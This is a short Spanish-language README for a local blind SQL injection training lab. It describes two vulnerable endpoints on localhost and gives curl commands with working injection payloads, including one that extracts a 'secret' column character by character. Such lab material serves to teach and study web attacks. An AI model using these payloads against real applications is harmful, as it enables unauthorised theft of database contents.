# Lab sqli-blind

Room: **sqli-basico** (task adicional). SQLi CIEGA: no hay errores ni datos visibles.

## Endpoints

| URL | Tipo de blind | Cómo detectar |
|---|---|---|
| `/check?id=1` | Boolean-based | TRUE → "User exists", FALSE → "not found" |
| `/status?service=X` | Time-based | SLEEP → respuesta tardía = TRUE |

## Ejemplos

```bash
# Boolean-based: ¿existe el usuario 1?
curl http://127.0.0.1:18092/check?id=1        # "User exists"
curl http://127.0.0.1:18092/check?id=2        # "User exists"
curl http://127.0.0.1:18092/check?id=99       # "not found"

# Inyectar boolean: ¿la tabla users tiene >0 filas?
curl "http://127.0.0.1:18092/check?id=1+OR+(SELECT+COUNT(*)+FROM+users)>0"
# → "User exists" (TRUE: sí hay filas)

# Extraer carácter por carácter (boolean oracle):
curl "http://127.0.0.1:18092/check?id=(SELECT+CASE+WHEN+(SUBSTR(secret,1,1)='F')+THEN+1+ELSE+99+END+FROM+users+WHERE+id=1)"
```
